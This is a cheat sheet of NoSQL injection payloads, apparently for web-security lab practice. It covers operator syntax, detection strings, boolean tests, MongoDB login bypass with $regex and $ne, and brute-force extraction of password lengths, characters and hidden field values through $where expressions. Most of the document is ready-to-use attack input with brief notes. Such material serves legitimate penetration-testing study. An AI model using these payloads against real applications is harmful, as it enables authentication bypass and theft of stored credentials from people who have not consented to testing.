# Basic operator difference between SQLi && NoSQLi
  1. ```or``` >> ```||```
  2. ```and``` >> ```&&```
  3. ```-- -``` >> ```%00``` 
# Detecting NoSQLi Vulnerability
```
'
\'
'+%26%26+1%3d%3d1%00
'+||+1%3d%3d1%00
'%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
'\"`{\r%3b$Foo}\n$Foo+\\xYZ\u0000
```
# Confirming conditional behavior
```
' && 0 && 'x
' && 1 && 'x
' || 1 || 'x
'%00
```
You can also remove the ```x``` end of the payload.
## Example with explanation:

  1. ```category=Gifts' && 0 && 'x``` >> This will return no items like ```category=Gifts' and 1=0-- -``` in sql injection.
  2. ```category=Gifts' && 1 && 'x``` >> This will return Gift items like ```category=Gifts' and 1=1-- -``` in sql injection.
  3. ```category=Gifts' || 1 || 'x``` >> This will return all the items like ```category=Gifts' or 1=1-- -``` in sql injection.

# NoSQL operator injection
```
    $where - Matches documents that satisfy a JavaScript expression.
    $ne - Matches all values that are not equal to a specified value.
    $in - Matches all of the values specified in an array.
    $regex - Selects documents where values match a specified regular expression.
```
## Submitting query operators
In JSON messages, you can insert query operators as nested objects. For example, ```{"username":"wiener"}``` becomes ```{"username":{"$ne":"invalid"}}```.

For URL-based inputs, you can insert query operators via URL parameters. For example, username=wiener becomes ```username[$ne]=invalid```. If this doesn't work, you can try the following:

    Convert the request method from GET to POST.
    Change the Content-Type header to application/json.
    Add JSON to the message body.
    Inject query operators in the JSON.
# MongoDB Login Bypass
```
{"$regex":""} >> For username
{"$ne":"Invalid"} >> For password
```
# MongoDB Data Retrieving
```
' && this.password.length < 50%00 >> For extracting password length in URL
' && this.password[0] == 'a'%00 >> For extracting password in URL
```
#Operator Injection To Retrieving Unknown Data

{"username":{"$regex":"admin"},"password":{"$ne":"Invalid"}}
{"username":{"$regex":"admin"},"password":{"$ne":"Invalid"},"$where":"e"} >> To generate an server error.
{"username":{"$regex":"admin"},"password":{"$ne":"Invalid"},"$where":"0"} >> To generate a false statement.
{"username":{"$regex":"admin"},"password":{"$ne":"Invalid","$where":"1"}} >> To generate a true statement.
{"username":{"$regex":"admin"},"password":{"$ne":"Invalid"},"$where":"0"}  >>  {"username":{"$regex":"admin"},"password":{"$ne":"Invalid","$where":"Object.keys(this)[0].match('^.{0}.*')"}}
{"username":{"$regex":"admin"},"password":{"$ne":"Invalid"},"$where":"0"}  >>  {"username":{"$regex":"admin"},"password":{"$ne":"Invalid","$where":"Object.keys(this)[0].match('^.{0}0.*')"}}

Object.keys(this)[0].match('^.{0}.*') >> To identify data size. Ex: Password
Object.keys(this)[0].match('^.{0}0.*') >> To fetch the data
this.forgotpwd.match('^.{0}.*') >> To fetch specific keyvalue data size.
this.forgotpwd.match('^.{0}0.*') >> To fetch specific keyvalue.

1st 0 means key number
2nd 0 means data size
3rd 0 means data character
For bruteforcing select only 2nd and 3rd 0
